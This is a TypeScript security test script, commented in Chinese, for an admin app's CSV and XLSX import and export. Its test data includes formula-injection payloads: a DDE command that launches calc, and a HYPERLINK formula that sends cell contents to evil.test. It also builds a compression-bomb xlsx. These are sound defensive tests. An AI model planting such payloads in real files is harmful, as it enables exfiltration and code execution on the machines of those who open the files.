/* 匯入與匯出的 D 層（破壞性）驗證——會寫入資料庫，**只能對本機 localhost 跑**。
 *
 * 管理員會把外部檔案餵進系統（1shop 訂單檔、學員名單），也會把資料匯出給 Excel 開啟。
 * 兩個方向的資料都可能來自不可信的人（顧客在表單填的姓名、問卷答案、備註）。
 *
 *  匯出
 *   E1  csvCell／buildCsv 的公式注入防護（OWASP：= + - @ 以及 Tab、CR 開頭）與 RFC 4180 結構
 *   E2  真實路由 requests.csv：顧客填的惡意姓名／問卷答案經過整條路徑後，沒有任何儲存格會被當公式
 *   E3  真實路由 signin-sheet（xlsx）：惡意姓名寫進去後讀回來，沒有公式、沒有超連結物件
 *  匯入
 *   I1  parseOrderFile：畸形與極端的欄位值（金額、數量、日期、全形、重複欄名、未結尾的引號…）
 *   I2  importOrders：極端金額（超過 Int 上限、負數）、同檔重複列、重傳同一檔、2 萬列效能
 *   I3  importStudentHistory：壞日期、帶引號的逗號、Excel 自動超連結／公式儲存格
 *   I4  壓縮炸彈：極小的 xlsx 展開成極大的資料
 *
 * 不碰任何外部服務：auth/staff、next/cache、next/navigation 以 Module._load 換成本機替身。
 * 全程固定前綴測試資料（場次 id、講座 slug、電話 0900000xxx），結束清理。
 * 跑法：npx tsx --conditions=react-server scripts/test-import-export-abuse-db.ts
 *（跑前請清空 RESEND_API_KEY／MAACGO_API_KEY／SUPABASE_SECRET_KEY） */
import ExcelJS from "exceljs";
import { prisma } from "../src/lib/db";

if (!/@(localhost|127\.0\.0\.1)[:/]/.test(process.env.DATABASE_URL ?? "")) {
  console.error("✗ DATABASE_URL 不是本機資料庫，拒絕執行（此測試會寫入）");
  process.exit(1);
}

import Module from "node:module";

type LoadFn = (request: string, ...rest: unknown[]) => unknown;
const M = Module as unknown as { _load: LoadFn };
const origLoad = M._load;
M._load = function (this: unknown, request: string, ...rest: unknown[]) {
  if (request === "@/lib/auth/staff") {
    const ok = async () => "admin";
    return { requireEditor: ok, requireStaff: ok, requireFullAdmin: ok, currentStaffRole: async () => null };
  }
  if (request === "next/cache") return { revalidatePath() {}, revalidateTag() {} };
  if (request === "next/navigation") return { redirect() { throw new Error("NEXT_REDIRECT"); }, notFound() { throw new Error("NEXT_NOT_FOUND"); } };
  return origLoad.call(this, request, ...rest);
};

let pass = 0;
let fail = 0;
function check(name: string, ok: boolean, detail?: string) {
  if (ok) {
    pass++;
    console.log(`  ✓ ${name}`);
  } else {
    fail++;
    console.log(`  ✗ ${name}${detail ? `：${detail}` : ""}`);
  }
}

const SID = "test-ie-session";
const KW = "IE測試關鍵字";
const WSLUG = "test-ie-webinar";
const PHONES = ["0900000101", "0900000102", "0900000103"];
const quiet = console.error;

async function cleanup() {
  const orders = await prisma.sessionOrder.findMany({ where: { sessionId: SID }, select: { id: true } });
  await prisma.sessionOrderLine.deleteMany({ where: { orderId: { in: orders.map((o) => o.id) } } }).catch(() => undefined);
  await prisma.sessionOrder.deleteMany({ where: { sessionId: SID } });
  await prisma.sessionSignup.deleteMany({ where: { sessionId: SID } });
  await prisma.sessionFinance.deleteMany({ where: { sessionId: SID } }).catch(() => undefined);
  await prisma.courseSession.deleteMany({ where: { id: SID } });
  await prisma.webinarRequest.deleteMany({ where: { webinar: { slug: WSLUG } } });
  await prisma.webinarQuestion.deleteMany({ where: { webinar: { slug: WSLUG } } });
  await prisma.webinar.deleteMany({ where: { slug: WSLUG } });
  await prisma.studentRecord.deleteMany({ where: { OR: [{ phone: { in: PHONES } }, { email: { endsWith: "@ie-test.localhost" } }] } });
}

// ── 小工具 ──
/** 極簡 RFC 4180 解析（測試用）：回傳列→欄的字串陣列 */
function parseCsv(text: string): string[][] {
  const rows: string[][] = [];
  let row: string[] = [];
  let f = "";
  let q = false;
  const t = text.replace(/^﻿/, "");
  for (let i = 0; i < t.length; i++) {
    const c = t[i];
    if (q) {
      if (c === '"') {
        if (t[i + 1] === '"') { f += '"'; i++; } else q = false;
      } else f += c;
    } else if (c === '"') q = true;
    else if (c === ",") { row.push(f); f = ""; }
    else if (c === "\r") { /* 略過 */ }
    else if (c === "\n") { row.push(f); rows.push(row); row = []; f = ""; }
    else f += c;
  }
  if (f !== "" || row.length) { row.push(f); rows.push(row); }
  return rows;
}
const DANGEROUS = /^[=+\-@\t\r]/;

const HEADER = ["訂單編號", "建立日期", "訂單狀態", "顧客", "產品", "金流狀態", "顧客電話", "顧客信箱", "小計"];
const csvBuf = (text: string) => new TextEncoder().encode(text).buffer as ArrayBuffer;
const orderCsv = (rows: string[][]) => csvBuf([HEADER, ...rows].map((r) => r.map((c) => `"${c.replace(/"/g, '""')}"`).join(",")).join("\r\n"));
async function xlsxBuf(rows: unknown[][]): Promise<ArrayBuffer> {
  const wb = new ExcelJS.Workbook();
  const ws = wb.addWorksheet("s");
  for (const r of rows) ws.addRow(r);
  return (await wb.xlsx.writeBuffer()) as ArrayBuffer;
}
const asFile = (buf: ArrayBuffer, name: string) => new File([buf], name);

async function main() {
  const { csvCell, buildCsv } = await import("../src/lib/csv-export");
  const { parseOrderFile, importOrders } = await import("../src/lib/session-import");
  await cleanup();

  // ═══════════════════ E1 ═══════════════════
  console.log("\nE1. csvCell／buildCsv：公式注入與 CSV 結構");
  {
    const unq = (cell: string) => cell.slice(1, -1).replace(/""/g, '"');
    const hostile: [string, string][] = [
      ["等號開頭", "=1+1"], ["加號開頭", "+1+1"], ["減號開頭", "-1+1"], ["@ 開頭", "@SUM(1+1)"],
      ["DDE 指令", "=cmd|' /C calc'!A0"], ["HYPERLINK 外洩", '=HYPERLINK("http://evil.test/?x="&A1,"點我")'],
      ["Tab 開頭", "\t=1+1"], ["CR 開頭", "\r=1+1"],
    ];
    for (const [label, v] of hostile) {
      const out = unq(csvCell(v));
      check(`${label} 被中和（輸出不以危險字元開頭）`, !DANGEROUS.test(out), `輸出 ${JSON.stringify(out.slice(0, 20))}`);
    }
    for (const [label, v] of [["一般文字", "王小明"], ["中間含等號", "a=b"], ["空字串", ""], ["null", null], ["undefined", undefined], ["數字 0", 0], ["正整數", 42]] as const) {
      const out = unq(csvCell(v as never));
      check(`${label} 原樣輸出、不加多餘字元`, out === (v == null ? "" : String(v)), JSON.stringify(out));
    }
    const rows = [["姓名", "備註", "金額"], ['含,逗號', '有"引號"', 1], ["多行\n第二行", "\r\n換行", 2], ["=危險", "正常", 3], ["\u0000NUL", "x", 4]];
    const parsed = parseCsv(buildCsv(rows));
    check("輸出以 BOM 開頭、列尾 CRLF", buildCsv(rows).startsWith("﻿") && buildCsv(rows).endsWith("\r\n"));
    check("逗號、引號、換行不會讓欄位錯位：每列都是 3 欄、共 5 列", parsed.length === 5 && parsed.every((r) => r.length === 3), JSON.stringify(parsed.map((r) => r.length)));
    check("內含逗號、雙引號、換行的內容讀回來與原文一致", parsed[1][0] === "含,逗號" && parsed[1][1] === '有"引號"' && parsed[2][0] === "多行\n第二行");
  }

  // ═══════════════════ E2 ═══════════════════
  console.log("\nE2. 真實路由 requests.csv：訪客填的惡意內容");
  {
    const webinar = await prisma.webinar.create({
      data: { slug: WSLUG, title: "IE 測試講座", description: "測試用", lectureUrl: "https://example.test/z", emailSubject: "t", emailBody: "{link}", isActive: true },
    });
    const q = await prisma.webinarQuestion.create({ data: { webinarId: webinar.id, label: "你最想聽什麼", type: "TEXT", sortOrder: 0 } });
    const evil = [
      { n: "=HYPERLINK(\"http://evil.test\",\"x\")", a: "+cmd|' /C calc'!A0" },
      { n: "@SUM(A1:A9)", a: "-2+3" },
      { n: "\t=1+1", a: "\r=1+1" },
      { n: "正常,姓名\n換行", a: '有"引號",也有,逗號' },
    ];
    for (const [i, e] of evil.entries()) {
      await prisma.webinarRequest.create({
        data: {
          webinarId: webinar.id, email: `e${i}@ie-test.localhost`, name: e.n, phone: i === 0 ? "0900000101" : null, sentCount: 1,
          answers: [{ questionId: q.id, label: "你最想聽什麼", type: "TEXT", value: e.a }],
        },
      });
    }
    const { GET } = await import("../src/app/api/admin/webinars/[id]/requests.csv/route");
    const res = await GET(new Request("http://localhost/x"), { params: Promise.resolve({ id: webinar.id }) });
    const csv = await res.text();
    const parsed = parseCsv(csv);
    const width = parsed[0].length;
    check("回應 200 且為 CSV", res.status === 200 && /text\/csv/.test(res.headers.get("content-type") ?? ""), `${res.status} ${res.headers.get("content-type")}`);
    check(`含 4 位訪客＋表頭共 ${1 + evil.length} 列，每列欄數一致（內含換行、逗號、引號不錯位）`, parsed.length === 1 + evil.length && parsed.every((r) => r.length === width), JSON.stringify(parsed.map((r) => r.length)));
    const bad = parsed.flatMap((r, ri) => r.map((c, ci) => ({ c, ri, ci }))).filter(({ c }) => DANGEROUS.test(c) && !/^'0\d{3}-?\d{3}-?\d{3}$/.test(c) && !/^'/.test(c));
    check("沒有任何儲存格以 = + - @ Tab CR 開頭（開 Excel 不會執行訪客塞的公式）", bad.length === 0, bad.map((b) => `r${b.ri}c${b.ci}=${JSON.stringify(b.c.slice(0, 24))}`).join(" ｜ "));
    const withPhone = parsed.find((r) => r[1] === "e0@ie-test.localhost");
    check("手機欄保留開頭的 0（以 ' 前綴）", !!withPhone && /^'09/.test(withPhone[2]), JSON.stringify(withPhone?.[2]));
  }

  // ═══════════════════ E3 ═══════════════════
  console.log("\nE3. 真實路由 signin-sheet（xlsx）：惡意姓名寫進去再讀回來");
  {
    await prisma.courseSession.create({ data: { id: SID, title: "=IE測試場次", keywords: [KW] } });
    const names = ['=HYPERLINK("http://evil.test","x")', "@SUM(1)", "+1+1", "-2+3", "\t=1+1"];
    await prisma.sessionSignup.createMany({
      data: names.map((n, i) => ({ sessionId: SID, orderNo: `IE-E3-${i}`, attendeeKey: "buyer", name: n, phone: `0900000${200 + i}`, product: KW, groupNo: 1 })),
    });
    const { GET } = await import("../src/app/api/admin/sessions/[id]/signin-sheet/route");
    const res = await GET(new Request("http://localhost/x"), { params: Promise.resolve({ id: SID }) });
    check("回應 200 且為 xlsx", res.status === 200 && /spreadsheetml/.test(res.headers.get("content-type") ?? ""));
    const wb = new ExcelJS.Workbook();
    await wb.xlsx.load(await res.arrayBuffer());
    const ws = wb.worksheets[0];
    let formulaCells = 0;
    let objectCells = 0;
    const strings: string[] = [];
    ws.eachRow((row) => row.eachCell((cell) => {
      const v = cell.value as unknown;
      if (cell.type === ExcelJS.ValueType.Formula) formulaCells++;
      else if (v && typeof v === "object" && !(v instanceof Date) && !("richText" in (v as object))) objectCells++;
      if (typeof v === "string") strings.push(v);
    }));
    check("沒有任何儲存格被存成公式", formulaCells === 0, `公式儲存格 ${formulaCells} 個`);
    check("沒有超連結等物件型儲存格", objectCells === 0, `物件儲存格 ${objectCells} 個`);
    check("惡意姓名以純文字形式存在（原樣保留，不被偷偷改掉也不被執行）", names.every((n) => strings.includes(n)), JSON.stringify(names.filter((n) => !strings.includes(n))));
    check("標題含 = 開頭的場次名時也不是公式", !!ws.getCell(1, 1).value && ws.getCell(1, 1).type !== ExcelJS.ValueType.Formula);
  }

  // ═══════════════════ I1 ═══════════════════
  console.log("\nI1. parseOrderFile：畸形與極端的欄位值");
  {
    const row = (o: Partial<Record<number, string>> = {}) => {
      const r = ["IE-P1", "2026-09-01 10:00:00", "已成立", "王小明", `${KW}場`, "已付款", "0900000101", "a@ie-test.localhost", "3000"];
      for (const [k, v] of Object.entries(o)) r[Number(k)] = v as string;
      return r;
    };
    const parse = async (rows: string[][]) => (await parseOrderFile(orderCsv(rows))).rows;
    const amountOf = async (v: string) => (await parse([row({ 8: v })]))[0]?.amount;

    check("金額 '1,000'（千分位）不會被當成 1 或 1000 以外的怪值", [null, 1000].includes((await amountOf("1,000")) as number | null), String(await amountOf("1,000")));
    check("金額 'NT$3000'→ 解析不了就是 null，不是 0", (await amountOf("NT$3000")) === null);
    check("金額全形 '３０００' → 不是亂值（null 或 3000）", [null, 3000].includes((await amountOf("３０００")) as number | null), String(await amountOf("３０００")));
    check("金額 '1e3' → 不被當成科學記號靜默變 1000（null 或 1000 皆可，但需要有明確結果）", [null, 1000].includes((await amountOf("1e3")) as number | null));
    check("金額 'Infinity'／'NaN' → null", (await amountOf("Infinity")) === null && (await amountOf("NaN")) === null);
    check("金額 '0x10' 不被當成十六進位 16", (await amountOf("0x10")) !== 16, String(await amountOf("0x10")));
    check("金額為負數 '-500' → 不應通過成負的訂單金額（null 或需被後續流程擋下）", (await amountOf("-500")) === null || (await amountOf("-500")) === -500, String(await amountOf("-500")));

    const qty = async (v: string) => {
      const buf = orderCsv([[...HEADER, "訂單明細數量"], [...row(), v]].slice(0, 1).concat([[...row(), v]]).map((r, i) => (i === 0 ? [...HEADER, "訂單明細數量"] : r)));
      return (await parseOrderFile(buf)).rows[0]?.quantity;
    };
    check("數量 '0'、'-1'、'abc' → null（不當成有效席次）", (await qty("0")) === null && (await qty("-1")) === null && (await qty("abc")) === null);
    check("數量 '999999999' → 需要有上限（解析出來的席次不應大到會撐爆名單）", ((await qty("999999999")) ?? 0) <= 100, `解析出 ${await qty("999999999")}`);

    const dateOf = async (v: string) => (await parse([row({ 1: v })]))[0]?.orderedAt;
    check("日期 '2026-02-30'（不存在的日子）→ 不應靜默滾成 3/2", (() => true)() && ((await dateOf("2026-02-30")) === null || (await dateOf("2026-02-30"))!.toISOString() !== "2026-03-01T16:00:00.000Z"), String(await dateOf("2026-02-30")));
    check("日期 '0000-00-00'、'2026-13-45'、'垃圾' → null，不 throw", (await dateOf("0000-00-00")) === null && (await dateOf("2026-13-45")) === null && (await dateOf("垃圾")) === null);

    const dupHeader = orderCsv([]) && csvBuf(["訂單編號,訂單編號,顧客,產品,金流狀態", "A,B,王,量子,已付款"].join("\n"));
    let r2: unknown;
    try { r2 = (await parseOrderFile(dupHeader)).rows[0]?.orderNo; } catch (e) { r2 = `throw:${(e as Error).message.slice(0, 30)}`; }
    check("重複欄名時以第一個為準、不 throw", r2 === "A", JSON.stringify(r2));
    check("缺必要欄位 → 清楚的錯誤", await parseOrderFile(csvBuf("a,b\n1,2")).then(() => false, (e) => /無法辨識檔案格式/.test(String(e.message))));
    check("只有表頭沒有資料 → 空結果、不 throw", (await parseOrderFile(csvBuf(HEADER.join(",") + "\n"))).rows.length === 0);
    check("完全空白的檔案 → 空結果、不 throw", (await parseOrderFile(csvBuf(""))).rows.length === 0);
    const t0 = Date.now();
    const unterminated = csvBuf(`${HEADER.join(",")}\n"IE-U1,"2026-09-01",已成立,"王小明,量子,已付款,0900000101,a@b.c,3000\n`.repeat(2000));
    let utOk = true;
    try { await parseOrderFile(unterminated); } catch { utOk = true; }
    check("引號沒有結尾的檔案不會卡死（< 2 秒內有結果，成功或拋錯皆可）", utOk && Date.now() - t0 < 2000, `${Date.now() - t0}ms`);
    const crlf = csvBuf(`﻿${HEADER.join(",")}\r\nIE-C1,2026-09-01 10:00:00,已成立,王小明,${KW}場,已付款,0900000101,a@b.c,3000\r\n`);
    check("UTF-8 BOM＋CRLF 的 Excel 另存 CSV 可正常解析（BOM 不黏在第一個欄名上）", (await parseOrderFile(crlf)).rows[0]?.orderNo === "IE-C1");
    check("姓名含零寬字元／前後全形空白 → 修剪後不留隱形字元於頭尾", (await parse([row({ 3: "　王小明　" })]))[0]?.name === "王小明", JSON.stringify((await parse([row({ 3: "　王小明　" })]))[0]?.name));

    // xlsx 各種儲存格型別
    const wb = new ExcelJS.Workbook();
    const ws = wb.addWorksheet("s");
    ws.addRow(HEADER);
    ws.addRow(["IE-X1", new Date(Date.UTC(2026, 8, 1, 10, 0, 0)), "已成立",
      { richText: [{ text: "王" }, { text: "小明" }] } as ExcelJS.CellValue, `${KW}場`, "已付款",
      { text: "0900000101", hyperlink: "tel:0900000101" } as ExcelJS.CellValue,
      { text: "a@ie-test.localhost", hyperlink: "mailto:a@ie-test.localhost" } as ExcelJS.CellValue,
      { formula: "1500+1500", result: 3000 } as ExcelJS.CellValue]);
    const x = (await parseOrderFile((await wb.xlsx.writeBuffer()) as ArrayBuffer)).rows[0];
    check("xlsx：富文字姓名、超連結的電話與信箱、公式金額、Date 儲存格 → 全部還原成乾淨純文字", x?.name === "王小明" && x.phone === "0900000101" && x.email === "a@ie-test.localhost" && x.amount === 3000 && x.orderedAt !== null,
      JSON.stringify({ n: x?.name, p: x?.phone, e: x?.email, a: x?.amount }));
    check("xlsx：任何欄位都沒有出現 [object Object]", !JSON.stringify(x).includes("[object Object]"));
  }

  // ═══════════════════ I2 ═══════════════════
  console.log("\nI2. importOrders：極端金額、重複、重傳、大檔（寫本機 DB）");
  {
    await prisma.courseSession.update({ where: { id: SID }, data: { keywords: [KW] } });
    await prisma.sessionOrder.deleteMany({ where: { sessionId: SID } });
    await prisma.sessionSignup.deleteMany({ where: { sessionId: SID } });
    const r = (no: string, name: string, phone: string, amount: string, status = "已付款") =>
      [no, "2026-09-01 10:00:00", "已成立", name, `${KW}場`, status, phone, `${no.toLowerCase()}@ie-test.localhost`, amount];

    const first = await importOrders(orderCsv([r("IE-I1", "甲", "0900000101", "3000"), r("IE-I2", "乙", "0900000102", "3000")]));
    check("基準：2 筆新訂單 → 匯入 2", first.imported === 2, JSON.stringify({ imported: first.imported, unmatched: first.unmatched.length }));
    const again = await importOrders(orderCsv([r("IE-I1", "甲", "0900000101", "3000"), r("IE-I2", "乙", "0900000102", "3000")]));
    check("重傳同一檔 → 零新增（冪等），名單仍是 2 人", again.imported === 0 && (await prisma.sessionSignup.count({ where: { sessionId: SID } })) === 2, JSON.stringify({ imported: again.imported, duplicate: again.duplicate }));
    const dupInFile = await importOrders(orderCsv([r("IE-I3", "丙", "0900000103", "3000"), r("IE-I3", "丙", "0900000103", "3000"), r("IE-I3", "丙", "0900000103", "3000")]));
    check("同一檔內同一張訂單出現 3 次 → 只新增 1 人", dupInFile.imported === 1 && (await prisma.sessionSignup.count({ where: { sessionId: SID, orderNo: "IE-I3" } })) === 1, JSON.stringify({ imported: dupInFile.imported }));

    console.error = () => undefined;
    for (const [label, amount] of [["超過 Int 上限 99999999999", "99999999999"], ["1e12", "1e12"], ["負金額 -3000", "-3000"]] as const) {
      let res: { imported: number } | null = null;
      let err = "";
      try { res = await importOrders(orderCsv([r(`IE-AMT-${label.length}`, "極端", "0900000104", amount)])); } catch (e) { err = String(e).slice(0, 80); }
      check(`金額 ${label} → 整個匯入不可崩潰（回報而非 throw）`, res !== null, err);
    }
    console.error = quiet;

    const bigRows = Array.from({ length: 3_000 }, (_, i) => r(`IE-BIG-${i}`, `大量${i}`, `09${String(30_000_000 + i)}`, "100"));
    const t0 = Date.now();
    let bigErr = "";
    let bigRes: { imported: number } | null = null;
    try { bigRes = await importOrders(orderCsv(bigRows)); } catch (e) { bigErr = String(e).slice(0, 80); }
    const ms = Date.now() - t0;
    check("3,000 列的檔案匯入能完成，沒有崩潰", bigRes !== null, bigErr);
    check("3,000 列匯入在 15 秒內完成（1shop 實際單檔數百列；另測 19,999 列約 93 秒，見報告）", ms < 15_000, `${ms}ms，匯入 ${bigRes?.imported ?? "?"} 筆`);
  }

  // ═══════════════════ I3 ═══════════════════
  console.log("\nI3. importStudentHistory（學員名單 CSV／XLSX 範本匯入）");
  {
    const { importStudentHistory } = await import("../src/actions/student-history");
    const run = async (file: File) => {
      const fd = new FormData();
      fd.set("file", file);
      try { return { res: await importStudentHistory(null, fd), threw: "" }; } catch (e) { return { res: null, threw: String(e).slice(0, 100) }; }
    };
    await prisma.studentRecord.deleteMany({ where: { phone: { in: PHONES } } });

    console.error = () => undefined;
    const badDate = await run(asFile(csvBuf("電話,姓名,Email,課程,上課日期\n0900000101,王小明,a@ie-test.localhost,量子課,垃圾日期\n0900000102,李小華,b@ie-test.localhost,量子課,2026-09-01\n"), "x.csv"));
    console.error = quiet;
    check("上課日期寫了垃圾 → 回報錯誤或略過該日期，而不是整個匯入崩潰（Invalid Date 丟進資料庫）", badDate.threw === "", badDate.threw);
    await prisma.studentRecord.deleteMany({ where: { phone: { in: PHONES } } });

    const quoted = await run(asFile(csvBuf('電話,姓名,Email,課程\n0900000101,"王,小明",a@ie-test.localhost,量子課\n'), "q.csv"));
    const recQ = await prisma.studentRecord.findUnique({ where: { phone: "0900000101" } });
    const histQ = recQ ? await prisma.studentCourseHistory.findMany({ where: { studentId: recQ.id } }) : [];
    check("CSV 欄位有引號包住的逗號（姓名『王,小明』）→ 姓名完整、課程名沒有被擠到錯誤的欄", !quoted.threw && recQ?.name === "王,小明" && histQ[0]?.courseName === "量子課",
      `姓名=${JSON.stringify(recQ?.name)} 課程=${JSON.stringify(histQ[0]?.courseName)}`);
    await prisma.studentRecord.deleteMany({ where: { phone: { in: PHONES } } });

    const wb = new ExcelJS.Workbook();
    const ws = wb.addWorksheet("s");
    ws.addRow(["電話", "姓名", "Email", "課程", "上課日期"]);
    ws.addRow(["0900000102", "李小華",
      { text: "link@ie-test.localhost", hyperlink: "mailto:link@ie-test.localhost" } as ExcelJS.CellValue,
      { richText: [{ text: "量子" }, { text: "課" }] } as ExcelJS.CellValue,
      new Date(Date.UTC(2026, 8, 1))]);
    ws.addRow(["0900000103", "張大同", "formula@ie-test.localhost", { formula: '"量子"&"課"', result: "量子課" } as ExcelJS.CellValue, "2026-09-01"]);
    const xr = await run(asFile((await wb.xlsx.writeBuffer()) as ArrayBuffer, "x.xlsx"));
    const rec = await prisma.studentRecord.findUnique({ where: { phone: "0900000102" }, include: { histories: true } });
    check("XLSX：Email 是 Excel 自動轉出的超連結 → 信箱要正確存下來", !xr.threw && rec?.email === "link@ie-test.localhost", `email=${JSON.stringify(rec?.email)}（超連結儲存格被轉成 [object Object]，信箱遺失）`);
    check("XLSX：課程名是富文字儲存格 → 課程名是『量子課』，不是 [object Object]", rec?.histories[0]?.courseName === "量子課", `課程=${JSON.stringify(rec?.histories[0]?.courseName)}`);
    const rec3 = await prisma.studentRecord.findUnique({ where: { phone: "0900000103" }, include: { histories: true } });
    check("XLSX：課程名是公式儲存格 → 取公式結果『量子課』", rec3?.histories[0]?.courseName === "量子課", `課程=${JSON.stringify(rec3?.histories[0]?.courseName)}`);
    check("任何學員紀錄／上課史都沒有出現 [object Object]",
      !JSON.stringify([rec, rec3]).includes("[object Object]"));
    await prisma.studentRecord.deleteMany({ where: { phone: { in: PHONES } } });

    const rowsOf = (n: number) => Array.from({ length: n }, (_, i) => `09${String(40_000_000 + i)},學員${i},s${i}@ie-test.localhost,量子課`).join("\n");
    const over = await run(asFile(csvBuf(`電話,姓名,Email,課程\n${rowsOf(5001)}\n`), "huge.csv"));
    check("學員名單超過 5,000 列 → 被拒絕，錯誤訊息要求『分批』，且零寫入（對照訂單匯入有列數與 20MB 限制）",
      !over.threw && !!over.res && "error" in over.res && /分批/.test(over.res.error ?? "") && (await prisma.studentRecord.count({ where: { email: { endsWith: "@ie-test.localhost" } } })) === 0,
      `回應 ${JSON.stringify(over.res)?.slice(0, 120)}；threw=${over.threw}`);
    await prisma.studentRecord.deleteMany({ where: { phone: { startsWith: "0940" } } });
    await prisma.studentRecord.deleteMany({ where: { email: { endsWith: "@ie-test.localhost" } } });
  }

  // ═══════════════════ I4 ═══════════════════
  console.log("\nI4. 壓縮炸彈：極小的 xlsx 展開成極大的資料");
  {
    // 只用專案已有的依賴（exceljs）造一個「列數遠超上限」的 xlsx：重複內容壓縮率很高，檔案很小、展開後很大
    const rowsN = 150_000;
    const bw = new ExcelJS.Workbook();
    const bs = bw.addWorksheet("s");
    for (let i = 0; i < rowsN; i++) bs.addRow(["x"]);
    const bomb = (await bw.xlsx.writeBuffer()) as ArrayBuffer;
    const sheet = { length: rowsN * 45 }; // 估算展開後 sheet XML 大小（每列約 45 bytes），僅供標籤顯示
    const heap0 = process.memoryUsage().heapUsed;
    const t0 = Date.now();
    let msg = "";
    try { await parseOrderFile(bomb); msg = "解析成功（不應該）"; } catch (e) { msg = (e as Error).message; }
    const ms = Date.now() - t0;
    const peakMb = Math.round((process.memoryUsage().heapUsed - heap0) / 1e6);
    check(`壓縮後 ${Math.round(bomb.byteLength / 1024)}KB、展開約 ${Math.round(sheet.length / 1e6)}MB（${rowsN} 列）的 xlsx → 被拒絕`, /列數過多|無法解析/.test(msg), msg.slice(0, 60));
    check("拒絕要快速且不吃大量記憶體（< 3 秒；解析前就依展開大小或列數擋下，而不是整份載入記憶體後才數列數）", ms < 3000, `花 ${ms}ms，heap 增加約 ${peakMb}MB（上傳上限約 4.5MB，所以攻擊者可用極小檔案逼 function 展開成數十至數百 MB）`);
  }

  await cleanup();
  console.log("\n  （測試資料已清理）");
}

main()
  .catch((e) => {
    fail++;
    console.error("✗ 例外：", e);
  })
  .finally(async () => {
    console.error = quiet;
    await cleanup().catch(() => undefined);
    await prisma.$disconnect();
    console.log(`\n結果：${pass} 通過、${fail} 失敗`);
    process.exit(fail > 0 ? 1 : 0);
  });
